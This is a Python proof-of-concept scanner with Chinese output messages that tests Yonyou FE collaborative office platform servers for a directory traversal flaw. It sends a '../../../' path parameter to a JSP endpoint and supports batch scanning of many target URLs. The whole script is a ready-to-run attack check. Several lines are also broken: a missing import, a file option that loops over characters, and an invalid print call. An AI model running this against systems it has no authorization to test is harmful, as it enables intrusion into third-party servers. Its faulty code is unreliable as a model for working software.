import time
import requests
import re
import sys
from urllib.parse import quote
import argparse
from rich.console import Console

console = Console()
def now_time():
    return time.strftime("[%H:%M:%S] ", time.localtime())
    
def main(target_url):
    if target_url[:4] != 'http':
        target_url = 'http://' + target_url
    if target_url[-1] != '/':
        target_url += '/'
    console.print(now_time() +  ' [INFO]     正在检测用友 FE协作办公平台目录遍历漏洞',style='bold blue')
    url = target_url + '/system/mediafile/templateOfTaohong_manager.jsp?path=/../../../'
    headers = {
        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.360'
    }
    try:
        requests.packages.urllib3.disable_warnings()
        response = requests.get(url=url, headers=headers, timeout=30)
        if response.status_code == 200 and response.text is not None:
            console.print(now_time() +  " [SUCCESS]  该系统可能存在目录遍历漏洞，具体URL为:{}".format(url),style='bold green')
        else:
            console.print(now_time() +  ' [WARNING]  FE协作办公平台目录遍历漏洞不存在', style='bold red')
    except:
        console.print(now_time() +  ' [WARNING]  无法该目标无法建立连接', style='bold red')
        
        
if __name__ == '__main__':
    try:
        parser = argparse.ArgumentParser()
        parser.add_argument('-u', '--url', dest='url', help='Target Url')
        parser.add_argument('-f', '--file', dest='file', help='Target Url')
        args = parser.parse_args()
        if args.file:
            pool = multiprocessing.Pool()
            for url in args.file:
                pool.apply_async(main, args=(url.strip('\n'),))
            pool.close()
            pool.join()
        elif args.url:
            main(args.url)
        else:
            console.print('缺少URL目标, 请使用 [-u URL] or [-f FILE]')
    except KeyboardInterrupt:
        console.console.print('\nCTRL+C 退出', style='reverse bold red')